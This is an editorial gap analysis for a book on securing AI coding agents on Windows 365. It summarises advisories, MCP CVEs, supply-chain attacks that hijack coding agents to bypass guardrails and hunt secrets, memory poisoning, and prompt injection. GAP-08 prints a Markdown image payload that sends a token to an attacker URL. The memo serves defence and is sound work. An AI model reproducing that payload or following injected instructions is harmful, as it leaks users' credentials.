# New Topics and Gap Analysis — W365ClawBook
**Generated:** 2026-05-31  
**Method:** Web research + per-chapter review against current published developments  
**Scope:** All 41 chapters + appendix  

---

## How to Read This Document

Each entry is structured as:
- **What changed / what's new** — the real-world development
- **Chapter(s) affected** — where it lands in the current TOC
- **Gap severity** — Critical / Important / Enhancement
- **Suggested action** — what to add, update, or note

---

## Critical Gaps — Must Address Before Publication

---

### GAP-01: Microsoft Agent 365 GA (May 1, 2026)

**What's new:** Microsoft Agent 365 reached general availability on May 1, 2026 at $15/user/month standalone. It is a unified control plane for managing locally running AI agents on Windows endpoints. At GA it can: discover and inventory locally running agents (including shadow/unsanctioned agents such as OpenClaw), import AWS Bedrock and Google Gemini Enterprise agents, extend Entra network controls to Copilot Studio agents and local agents, and enforce Intune policy to block unauthorized OpenClaw deployment methods. A **Shadow AI detection page** surfaces agent activity detected via Defender and Intune. Starting June 2026, Defender adds **asset context mapping** — for each agent, mapping the devices it runs on, MCP servers it connects to, associated identities, and reachable cloud resources.

**Chapters affected:** Ch27 (Identity Architecture), Ch31 (Endpoint Protection), Ch32 (Intune Configuration Profiles), Ch33 (Monitoring and Forensics), Ch37 (Component Summary Matrix)

**Gap severity:** Critical

**Suggested action:** The book currently describes manually assembling agent governance controls via Intune, Entra, and Defender for Endpoint. Agent 365 GA centralizes exactly these controls as a product. Two actions needed:
1. Add a sidebar or new section in Ch27 or Ch31 noting that Agent 365 is now available and is the recommended enterprise governance platform, with a cross-reference to Ch32's manual Intune approach as the pre-Agent 365 alternative.
2. Consider whether Chapter 33's monitoring KQL queries should be supplemented with Agent 365's asset context mapping as the preferred discovery mechanism for agent-to-MCP-server relationships.

**Source:** Microsoft Security Blog, May 1, 2026 — "Microsoft Agent 365 now generally available"

---

### GAP-02: Windows 365 for Agents (January 22, 2026 — Public Preview)

**What's new:** Microsoft announced **Windows 365 for Agents** on January 22, 2026 — a Cloud PC variant purpose-built for agentic AI workloads with a new consumption-based SKU. Agents can interact with applications, browsers, files, and enterprise systems through natural language. GA is projected Q4 2026. At Build 2026, Microsoft formally positioned Windows as an agent execution platform for developers with dedicated APIs and SDKs.

**Chapters affected:** Ch01 (Introduction), Ch02 (Architecture Overview), Ch17 (Importing into Windows 365), Ch37 (Component Summary Matrix)

**Gap severity:** Critical

**Suggested action:** Chapter 1's economic argument and Chapter 2's architecture diagram are built around standard Windows 365 Enterprise. Windows 365 for Agents is an adjacent SKU specifically designed for the exact workload the book covers. Recommended actions:
1. Add a callout in Chapter 1 noting that Windows 365 for Agents is in public preview as of the book's publication date, with a note on expected GA timing and the consumption-based pricing model vs. the per-user fixed-price model described in the cost tables.
2. Add a note in Chapter 17 on provisioning policy considerations if/when the "for Agents" SKU provisioning flow differs from standard Windows 365 Enterprise.

**Source:** Microsoft Windows Blog, January 22, 2026 — "Windows 365 for Agents: The Cloud PC's Next Chapter"

---

### GAP-03: Five Eyes Joint Guidance on Agentic AI (May 1, 2026)

**What's new:** CISA, NSA, ASD ACSC (Australia), CCCS (Canada), NCSC (New Zealand), and NCSC (UK) issued 30-page joint guidance titled **"Careful Adoption of Agentic AI Services"** on May 1, 2026. This is the first intelligence-community joint advisory specifically addressing agentic AI. Core message: agentic AI "will likely misbehave and amplifies organizations' existing frailties." Five risk categories named: privilege escalation, design/configuration flaws, behavioral risks (goal pursuit outside designer intent), structural risk (cascading agent failures), and accountability (opaque decision logs). Explicitly recommends zero trust, defense-in-depth, and least-privilege — the exact framework used in Part VI.

**Chapters affected:** Ch26 (Agent Threat Model), Ch27 (Identity Architecture), Ch29 (Hardening OpenClaw)

**Gap severity:** Critical

**Suggested action:** This is the highest-authority government validation of the book's threat model and its framing of agentic AI risk. Cite it in the Chapter 26 introduction statistics section alongside the existing Gartner and CrowdStrike figures. The Five Eyes classification of "structural risk" (cascading agent failures across a network of agents) and "accountability gaps" (opaque decision logs) directly justify the Chapter 27 secondary user architecture and Chapter 33 forensics logging controls.

**Source:** The Register / CyberScoop / CISA.gov, May 1, 2026

---

### GAP-04: NSA MCP Security Advisory (May 20, 2026)

**What's new:** NSA released a 17-page guidance document **"Model Context Protocol: Security Design Considerations for AI-Driven Automation"** (U/OO/6030316-26 / PP-26-1834) on May 20, 2026. Key findings: MCP's rapid adoption has outpaced its security model; MCP does not define session-to-verifiable-identity mapping; authentication is optional in the spec; RBAC is not part of the protocol. NSA recommendations include least-privilege tokens per action, signed provenance checks for dynamic tool discovery, filtering outbound proxies, DLP, sandboxing, message integrity checks, and local MCP scans. Government contractor compliance timelines: MCP risk assessment within 30 days, cryptographic isolation within 90 days, FedRAMP-authorized hosting within 120 days.

**Chapters affected:** Ch26 (Agent Threat Model), Ch28 (Hardening Claude Code), Ch29 (Hardening OpenClaw), Ch30 (Network Segmentation)

**Gap severity:** Critical

**Suggested action:** This is the highest-authority source available for validating the book's MCP threat coverage. Actions:
1. Cite NSA document U/OO/6030316-26 in Chapter 26 threat statistics and in Chapter 30's MCP section.
2. In Chapter 28's MCP server hardening guidance and Chapter 29's skill validation guidance, note that NSA specifically flags the lack of mandatory authentication in the MCP spec — reinforcing why the book's gateway binding and token validation controls are necessary.
3. If the book has any government/contractor audience in scope, add the compliance timeline callout (30/90/120 days) as a sidebar.

**Source:** NSA, May 20, 2026 — nsa.gov/Portals/75/documents/Cybersecurity/CSI_MCP_SECURITY.pdf

---

### GAP-05: MCP 30+ CVEs in 60 Days (January–February 2026)

**What's new:** Between January and February 2026, security researchers filed 30+ CVEs targeting MCP servers, clients, and infrastructure. Research found 82% of MCP servers vulnerable to path traversal and 38–41% lacking any authentication. Five catalogued attack classes: tool poisoning, prompt injection via external data, trust bypass, supply chain, and cross-tenant exposure. Key CVEs:

| CVE | CVSS | Description |
|---|---|---|
| CVE-2025-49596 | Critical | RCE in MCP-Inspector via crafted messages |
| CVE-2025-6514 | 9.6 | RCE in `mcp-remote` (437,000+ downloads before disclosure) |
| CVE-2025-68145 | High | Path validation bypass in Anthropic `mcp-server-git` |
| CVE-2025-68143 | High | Unrestricted `git_init` in Anthropic `mcp-server-git` |
| CVE-2025-68144 | High | Argument injection in `git_diff` in `mcp-server-git` |
| CVE-2025-54136 | High | MCP Rug Pull — tool command swapped after user approval; Cursor trusted name over content |

**The MCP Rug Pull (CVE-2025-54136):** An attacker publishes a legitimate MCP server, waits for user approval, then pushes an update that swaps the benign command for a malicious payload. Most MCP hosts re-approve silently because trust is bound to the tool's **name**, not its **content or hash**. MCPTox benchmark: 72.8% attack success rate across 20 AI agents and 353 authentic tools. Cross-tool manipulation: a poisoned tool's description alone can steer model behavior in **other** tools, without the poisoned tool being called.

**Chapters affected:** Ch26 (Threat Model), Ch28 (Hardening Claude Code), Ch29 (Hardening OpenClaw), Ch30 (Network Segmentation)

**Gap severity:** Critical

**Suggested action:**
1. Add MCP Rug Pull to Chapter 26's threat taxonomy alongside prompt injection and supply chain poisoning. The rug pull is architecturally distinct — it exploits the trust-on-approval model, not the approval gate itself.
2. In Chapter 28 (Claude Code MCP server hardening), note that Claude Code's MCP host should be configured with the `enhanced-approval-on-description-change` flag if available, and that users should treat any MCP server update as requiring re-review.
3. CVE-2025-49596 and CVE-2025-6514 (mcp-remote) are directly relevant to the MCP server catalog in Chapter 28 — add to the minimum version / CVE tracking guidance.
4. The 82% path traversal statistic for MCP servers is a stronger supporting statistic than anything currently in the book for this threat class.

**Sources:** agent-wars.com/news/2026-03-13-mcp-security-2026-30-cves-in-60-days; vulnerablemcp.info; Invariant Labs; dev.to MCP Rug Pull

---

## Important Gaps — Should Address Before Publication

---

### GAP-06: npm Supply Chain Attacks Targeting AI Agents as Attack Intermediaries (August–September 2025)

**What's new:** Two separate campaigns weaponized AI coding agents themselves as malware delivery intermediaries — a new second-order supply chain threat vector distinct from the ClawHub marketplace threat covered in Chapters 13 and 29.

**Nx/Claude Code postinstall attack (August 26–27, 2025):** Eight malicious Nx and Nx Powerpack releases pushed to npm. The `postinstall` script directly invoked **Claude Code, Google Gemini CLI, and Amazon Q CLI** using unsafe flags to bypass guardrails and scan for secrets. Lived for 5 hours 20 minutes before removal. Documented by Snyk.

**Shai-Hulud campaign (September 15, 2025):** Trojanized 40+ npm packages including `@ctrl/tinycolor`. Injected `bundle.js` ran TruffleHog to hunt for tokens, abused found credentials, and planted GitHub Actions workflows in victim repositories.

**TrapDoor campaign (2026):** 34+ malicious packages across npm, PyPI, and Crates.io. The campaign README literally described itself as a "Universal AI Agent Extraction Framework" — staged workflows for capability detection, data extraction, self-replication, and telemetry reporting.

**Chapters affected:** Ch13 (Supply Chain Integrity), Ch25 (Agent Updates Without Reprovisioning), Ch29 (Hardening OpenClaw)

**Gap severity:** Important

**Suggested action:** Chapter 13 focuses on supply chain integrity at image build time (SHA256 verification of installers). The Nx/Claude Code attack is an orthogonal threat: a poisoned package that the agent *executes during a coding task* invokes the agent itself as a delivery mechanism. This warrants:
1. A new sidebar in Chapter 13 or Chapter 29 noting that npm packages installed during agent-driven tasks are a distinct supply chain surface from packages installed at image build time — they are not SHA256-verified.
2. A recommendation to configure npm to use the Azure Artifacts proxy (already described in Chapter 30's supply chain section) as a mandatory egress path for all npm install operations, with a curated allow/deny list.
3. In Chapter 25, note that `npm update -g openclaw` during post-provisioning should validate the update's hash against a known-good manifest before execution.

**Sources:** Snyk Blog; InfoQ — "NPM Ecosystem: Two AI-Enabled Credential Stealing Supply Chain Attacks"; Oligo Security

---

### GAP-07: MINJA Memory Poisoning Research — Quantified Statistics (2025)

**What's new:** The MINJA (Memory Injection Attack) research, presented at NeurIPS 2025, provides quantitative backing for the long-term memory threat that Chapter 29 describes qualitatively (SOUL.md, MEMORY.md). Key statistics:
- Over **95% injection success rate** through regular queries with no special privileges.
- **70% attack success rate** in downstream task manipulation.
- Attack success jumps from 40% baseline to **80%+** when the agent uses memory augmentation (RAG) — counter-intuitively, memory-augmented agents are more vulnerable.
- Memory poisoning is **persistent** — the agent recalls the malicious instruction in future sessions days or weeks later without re-injection.
- OWASP classifies this as **ASI06 — Memory and Context Poisoning** in the 2026 Agentic Top 10.

Five architectural mitigations required: memory partitioning, context isolation, provenance tracking, temporal decay, and behavioral monitoring.

**Chapters affected:** Ch26 (Threat Model), Ch29 (Hardening OpenClaw)

**Gap severity:** Important

**Suggested action:** 
1. The 95% injection success rate and 80%+ RAG amplification effect are significantly more alarming than anything the book currently cites for the SOUL.md/MEMORY.md threat. Add these statistics to Chapter 26's threat statistics section under the memory manipulation threat class.
2. In Chapter 29, the SOUL.md controls section should note OWASP ASI06 classification and add the five mitigation layers as a structured defense checklist.
3. The temporal decay mitigation (setting expiration on long-term memory entries) may not be addressed in the current OpenClaw SOUL.md guidance — add if applicable.

**Sources:** MINJA NeurIPS 2025 paper; arXiv:2604.16548; MintMCP blog; OWASP ASI06

---

### GAP-08: OpenHands "Lethal Trifecta" — Token Exfiltration via Prompt Injection (August 9, 2025)

**What's new:** A zero-click prompt injection vulnerability in OpenHands (the real-world model for the book's OpenClaw) was privately disclosed on March 13, 2025 and publicly disclosed on August 9, 2025 after 148 days without a meaningful vendor response. The attack chain: malicious Markdown image tag `![img](attacker_server?data=TOKEN)` embedded in a repository, webpage, or uploaded document. When the agent renders the content, the `GITHUB_TOKEN` (and any other chat/memory context) is appended to the attacker's URL as query parameters. Zero-click; no user interaction beyond the agent encountering the content. Microsoft rates such zero-click token leaks as **Critical**. The root fix was a Content-Security-Policy restricting image loads.

A separate **environment variable exposure issue (GitHub Issue #9124)** documents agents reading `.env` files during tasks and exposing their contents, classified as OWASP LLM08 (Excessive Agency).

**Chapters affected:** Ch26 (Threat Model), Ch29 (Hardening OpenClaw)

**Gap severity:** Important

**Suggested action:**
1. The 148-day disclosure gap between private report and public disclosure is direct evidence for the book's framing that enterprise teams cannot rely on upstream vendor response SLAs when patching OpenClaw-class agents. Add this as narrative context in Chapter 29's "Presume Breach" introduction.
2. The Lethal Trifecta attack chain (image tag → token exfiltration) is the real-world template for the fictional CVE-2026-25253 in the book. This should be noted — if not by name, then as "a representative real-world instance of this attack class" — to give readers a concrete example.
3. The `.env` exposure issue reinforces Chapter 39's (Secrets Management) warning about plaintext secrets in agent-readable paths.

**Sources:** embracethered.com/blog; GitHub All-Hands-AI/OpenHands issue #7594 and #9124

---

### GAP-09: NIST AI Agent Standards Initiative (February 2026)

**What's new:** NIST's Center for AI Standards and Innovation (CAISI) launched the **AI Agent Standards Initiative** in February 2026 with three pillars: industry-led standards development, community-led open-source protocol development, and foundational security and identity research. The NCCoE framework proposes applying **OAuth 2.0, OpenID Connect, SCIM, SPIFFE/SPIRE, and ABAC** to AI agents as distinct non-human identities requiring enterprise-grade lifecycle management. Listening sessions in April 2026 targeted healthcare, financial services, and education sectors.

**Chapters affected:** Ch27 (Identity Architecture)

**Gap severity:** Important

**Suggested action:** Chapter 27's Entra Agent ID section provides the Microsoft-centric view of agent identity. The NIST initiative provides the standards-body framing that will govern cross-vendor agent identity interoperability. Add a paragraph noting that NIST CAISI is the emerging standards backdrop — particularly SPIFFE/SPIRE for workload identity federation and SCIM for agent lifecycle management — for organizations building agent identity systems that extend beyond Microsoft's ecosystem.

**Sources:** NIST CAISI announcement February 2026; NCCOE nhi.101; NHIMG workload identity

---

### GAP-10: OWASP Agentic Skills Top 10 (2026)

**What's new:** OWASP published a companion document to the Agentic Applications Top 10 specifically for **agentic skills and plugins** — directly applicable to ClawHub skill security. This formalizes the risk taxonomy for skill/plugin supply chains that the book's Chapter 13 and Chapter 29 address.

**Chapters affected:** Ch13 (Supply Chain Integrity), Ch26 (Threat Model), Ch29 (Hardening OpenClaw)

**Gap severity:** Important

**Suggested action:** Add a reference to OWASP Agentic Skills Top 10 (owasp.org/www-project-agentic-skills-top-10) in Chapter 29's skill validation section alongside the existing Cisco Skill Scanner reference. The OWASP taxonomy provides a vendor-neutral classification system for the ClawHavoc-style threats the chapter describes.

**Sources:** OWASP www-project-agentic-skills-top-10

---

### GAP-11: Microsoft Agent Governance Toolkit (Open Source, April 2026)

**What's new:** Microsoft released the **Agent Governance Toolkit** as open source in April 2026 — a runtime security framework for AI agents implementing the governance principles in Microsoft's AI agent security guidance. Includes policy enforcement, audit logging, identity attribution, and tool invocation controls. Confirmed community OpenClaw integration in the toolkit repository.

**Chapters affected:** Ch27 (Identity Architecture), Ch29 (Hardening OpenClaw), Ch33 (Monitoring and Forensics)

**Gap severity:** Important

**Suggested action:** The toolkit is directly relevant to the governance controls described in Chapters 27, 29, and 33. Add a reference in Chapter 29 noting that Microsoft's Agent Governance Toolkit provides reference implementations for the policy enforcement patterns described — particularly for organizations that want to extend agent governance beyond native OpenClaw settings.

**Sources:** Microsoft Open Source Blog, April 2026 — "Introducing the Agent Governance Toolkit"

---

### GAP-12: CVE-2026-32173 — Azure SRE Agent WebSocket Exposure (CVSS 8.6)

**What's new:** CVE-2026-32173 (CVSS 8.6) — Azure SRE Agent exposed live command streams through an unauthenticated WebSocket endpoint accessible to any Entra ID account holder. This is a first-party Microsoft vulnerability directly analogous to the book's fictional OpenClaw CVEs involving unauthenticated WebSocket gateway exposure (CVE-2026-25253, CVE-2026-28472, CVE-2026-22172).

**Chapters affected:** Ch26 (Threat Model), Ch29 (Hardening OpenClaw)

**Gap severity:** Important

**Suggested action:** This CVE demonstrates that WebSocket authentication bypass is not an OpenClaw-specific implementation failure — it has occurred in Microsoft's own production agent infrastructure. Cite this in Chapter 26's threat model statistics as evidence that even mature, enterprise-grade agent platforms ship with critical gateway authentication flaws, reinforcing the "Presume Breach" posture of Chapter 29.

**Sources:** CVE database; cyberdesserts.com AI Agent Security Risks 2026

---

## Enhancement Opportunities — Strengthen Existing Content

---

### GAP-13: Real CVE Numbers for Claude Code Align with Book's Fictional Timeline

**What's new:** Check Point Research documented two real CVEs for Claude Code that align almost precisely with the fictional CVE timeline in Chapter 28:

| Real CVE | CVSS | Description | Fixed in |
|---|---|---|---|
| CVE-2025-59536 | 8.7 | RCE via malicious `.claude/settings.json` hooks — arbitrary shell commands execute when opening an untrusted repository | v1.0.111 (October 2025) |
| CVE-2026-21852 | 5.3 | API key exfiltration via `ANTHROPIC_BASE_URL` override in project config | v2.0.65 (January 2026) |

The book's Chapter 28 uses these exact same CVE numbers and version numbers for its fictional CVE table. This is an important editorial note — if published, readers will find that searching for these CVE numbers returns real Check Point Research findings for the real Anthropic Claude Code product.

**Chapters affected:** Ch28 (Hardening Claude Code)

**Gap severity:** Enhancement

**Suggested action:** This is both a validation (the fictional CVEs are modeled on real vulnerabilities, which confirms their authenticity) and an editorial decision point: should the chapter clarify that the CVE numbers reference real published vulnerabilities in the Anthropic Claude Code product? Recommended approach: keep the CVE numbers as they are (they're already correct for the real product), and add a note that the CVE table documents verified vulnerabilities in Claude Code and links to the Check Point research advisory.

**Sources:** research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536; The Hacker News; Dark Reading

---

### GAP-14: Cline Enterprise GA — Market Context for Enterprise Agent Deployment

**What's new:** Cline Enterprise reached GA with Fortune 500 deployments (Samsung, SAP, Oracle, Salesforce). Features include remote configuration dashboard, per-team model/tool allowlisting, private inference endpoints (no code upload), and model-agnostic architecture. Now available as VS Code extension, JetBrains plugin, Cursor/Windsurf/Zed integrations, and CLI preview.

**Chapters affected:** Ch01 (Introduction), Ch25 (Agent Updates Without Reprovisioning), Ch37 (Component Summary Matrix)

**Gap severity:** Enhancement

**Suggested action:** The book currently describes a two-agent landscape (OpenClaw + Claude Code) with Codex CLI as a third option. Cline Enterprise's Fortune 500 adoption establishes it as a legitimate enterprise-grade third option that some readers may already be deploying. Consider adding Cline to the Component Summary Matrix as an optional third agent with a note on its VS Code-embedded deployment model (distinct from OpenClaw's background service model).

**Sources:** cline.bot/enterprise; opensourceaireview.com

---

### GAP-15: OpenHands Raises $18.8M Series A — Market Validation

**What's new:** OpenHands (All-Hands AI) raised $18.8M Series A in November 2025 for enterprise-scale cloud coding agents. All Hands Online (Beta) launched simultaneously with native GitHub, GitLab, CI/CD, and Slack integrations. The announced trajectory is managed multi-tenant deployment competing with hosted Devin.

**Chapters affected:** Ch01 (Introduction)

**Gap severity:** Enhancement

**Suggested action:** Chapter 1's "Why AI Agents on Windows 365" could benefit from a brief note acknowledging that while cloud-hosted versions of these agents exist, the book's Windows 365 self-hosted model is motivated by data sovereignty, enterprise security posture, and organizational policy requirements that cloud-hosted agents cannot satisfy. The Series A funding validates the category without undermining the book's self-hosted premise.

**Sources:** BusinessWire / OpenHands blog, November 2025

---

### GAP-16: AI Agent Identity Governance Gap — Statistics

**What's new:** New research quantifies the identity governance gap that Chapter 27 addresses:
- Only **18%** of security leaders express high confidence their current IAM can handle agent identities.
- Only **23%** of organizations have a formal enterprise-wide strategy for agent identity management.
- The dominant workaround: sharing human credentials with agents because no enterprise-grade alternative exists in most organizations.

**Chapters affected:** Ch27 (Identity Architecture)

**Gap severity:** Enhancement

**Suggested action:** Add the 18% and 23% statistics to Chapter 27's opening section on "Why Primary User Identity Fails" to establish that the secondary user / Agent ID architecture the chapter describes is addressing a genuine and widespread gap, not an edge case. These statistics come from The Strata.io/Security Boulevard 2026 research reports.

**Sources:** strata.io/blog/agentic-identity; securityboulevard.com CISO Playbook 2026

---

### GAP-17: VS Code Internal MCP Registry and Allowlist Controls (November 2025)

**What's new:** VS Code shipped internal MCP registry and allowlist controls in public preview in November 2025. Organizations can now restrict which MCP servers can be installed in VS Code by allowlisting approved servers via GitHub Changelog entry (2025-11-18).

**Chapters affected:** Ch24 (VS Code Extensions), Ch28 (Hardening Claude Code)

**Gap severity:** Enhancement

**Suggested action:** Chapter 24 covers VS Code extension deployment via Intune. Chapter 28 covers Claude Code MCP server hardening. The VS Code MCP allowlist control is an additional enterprise governance layer directly applicable to the book's deployment model — add to Chapter 24's VS Code enterprise configuration section and cross-reference in Chapter 28.

**Sources:** GitHub Changelog, November 18, 2025

---

### GAP-18: OWASP LLM06:2025 — Excessive Agency Update

**What's new:** OWASP's updated LLM Top 10 (2025 edition) refined **LLM06: Excessive Agency** — the risk of an LLM agent being granted too many permissions, tools, or scope. This is the direct standards-body backing for the Chapter 29 principle of constraining OpenClaw's channel integrations and tool permissions.

**Chapters affected:** Ch26 (Threat Model), Ch29 (Hardening OpenClaw)

**Gap severity:** Enhancement

**Suggested action:** Chapter 26 cites the OWASP LLM Top 10 and OWASP Agentic Top 10. Confirm that LLM06:2025 Excessive Agency is explicitly cited in the context of OpenClaw's channel integration scope (Slack workspace, email, Azure DevOps, GitHub OAuth). The principle maps directly to the Chapter 27 minimal-scope agent account design.

**Sources:** genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025

---

## Summary Table

| Gap ID | Topic | Chapters | Severity | Action |
|---|---|---|---|---|
| GAP-01 | Microsoft Agent 365 GA (May 1, 2026) | Ch27, Ch31, Ch32, Ch33, Ch37 | **Critical** | Add dedicated coverage of Agent 365 as enterprise governance platform |
| GAP-02 | Windows 365 for Agents public preview (Jan 22, 2026) | Ch01, Ch02, Ch17, Ch37 | **Critical** | Add callout on preview SKU; note Q4 2026 GA target |
| GAP-03 | Five Eyes joint agentic AI guidance (May 1, 2026) | Ch26, Ch27, Ch29 | **Critical** | Cite in Ch26 statistics; validates Part VI framework |
| GAP-04 | NSA MCP Security Advisory (May 20, 2026) | Ch26, Ch28, Ch29, Ch30 | **Critical** | Cite U/OO/6030316-26; add contractor compliance timelines |
| GAP-05 | MCP 30+ CVEs in 60 days + Rug Pull (CVE-2025-54136) | Ch26, Ch28, Ch29, Ch30 | **Critical** | Add rug pull to threat taxonomy; cite 72.8% MCPTox success rate |
| GAP-06 | npm supply chain attacks using agents as intermediaries | Ch13, Ch25, Ch29 | **Important** | Add second-order supply chain threat; Azure Artifacts proxy enforcement |
| GAP-07 | MINJA memory poisoning (95% injection success rate) | Ch26, Ch29 | **Important** | Add stats to threat model; add OWASP ASI06 to SOUL.md controls |
| GAP-08 | OpenHands Lethal Trifecta — 148-day disclosure gap | Ch26, Ch29 | **Important** | Cite as evidence for presume-breach posture; template for fictional CVEs |
| GAP-09 | NIST AI Agent Standards Initiative (Feb 2026) | Ch27 | **Important** | Add SPIFFE/SPIRE and SCIM context for cross-vendor agent identity |
| GAP-10 | OWASP Agentic Skills Top 10 (2026) | Ch13, Ch26, Ch29 | **Important** | Reference alongside Cisco Skill Scanner in skill validation |
| GAP-11 | Microsoft Agent Governance Toolkit (Apr 2026, open source) | Ch27, Ch29, Ch33 | **Important** | Reference as open-source reference implementation |
| GAP-12 | CVE-2026-32173 Azure SRE Agent WebSocket exposure | Ch26, Ch29 | **Important** | Cite as first-party evidence for WebSocket auth bypass risk |
| GAP-13 | Real CVE numbers for Claude Code match book's fictional table | Ch28 | Enhancement | Confirm CVE-2025-59536 and CVE-2026-21852 as real, link to Check Point |
| GAP-14 | Cline Enterprise GA — Fortune 500 deployments | Ch01, Ch25, Ch37 | Enhancement | Add as optional third agent in Component Summary Matrix |
| GAP-15 | OpenHands $18.8M Series A + All Hands Online Beta | Ch01 | Enhancement | Acknowledge cloud-hosted agents; reinforce self-hosted rationale |
| GAP-16 | Identity governance gap statistics (18% / 23%) | Ch27 | Enhancement | Add to "Why Primary User Identity Fails" opening |
| GAP-17 | VS Code internal MCP registry and allowlist controls | Ch24, Ch28 | Enhancement | Add to VS Code enterprise configuration section |
| GAP-18 | OWASP LLM06:2025 Excessive Agency refinement | Ch26, Ch29 | Enhancement | Confirm citation in channel integration scope justification |

---

## Appendix: Key Sources

| Source | URL / Reference | Relevance |
|---|---|---|
| NSA MCP Advisory | nsa.gov/Portals/75/documents/Cybersecurity/CSI_MCP_SECURITY.pdf | GAP-04 |
| Five Eyes Agentic AI Guidance | CISA.gov (May 1, 2026) | GAP-03 |
| Microsoft Agent 365 GA Blog | microsoft.com/en-us/security/blog/2026/05/01/... | GAP-01 |
| Windows 365 for Agents | blogs.windows.com/windowsexperience/2026/01/22/... | GAP-02 |
| Check Point CVE-2025-59536 | research.checkpoint.com/2026/rce-and-api-token... | GAP-13 |
| Snyk Nx/Claude Code Attack | snyk.io/blog/weaponizing-ai-coding-agents-for-malware... | GAP-06 |
| OWASP Agentic Top 10 2026 | genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026 | GAP-07, GAP-10 |
| OWASP Agentic Skills Top 10 | owasp.org/www-project-agentic-skills-top-10 | GAP-10 |
| OpenHands Lethal Trifecta | embracethered.com/blog/posts/2025/openhands-lethal-trifecta | GAP-08 |
| NIST AI Agent Standards Initiative | nist.gov/news-events/news/2026/02/announcing-ai-agent-standards-initiative | GAP-09 |
| Microsoft Agent Governance Toolkit | opensource.microsoft.com/blog/2026/04/02/agent-governance-toolkit | GAP-11 |
| MCP CVE Timeline | vulnerablemcp.info; authzed.com/blog/timeline-mcp-breaches | GAP-05 |
| MCP Rug Pull (CVE-2025-54136) | dev.to/waxell/the-mcp-rug-pull-attack | GAP-05 |
| MCPTox Benchmark | invariantlabs.ai/blog/mcp-security-notification-tool-poisoning | GAP-05 |
| MINJA Memory Poisoning | arxiv.org/html/2604.16548v1 | GAP-07 |
| VS Code MCP Allowlist Preview | github.blog/changelog/2025-11-18-internal-mcp-registry | GAP-17 |
| Strata Identity Governance Gap | strata.io/blog/agentic-identity | GAP-16 |
| Cline Enterprise | cline.bot/enterprise | GAP-14 |
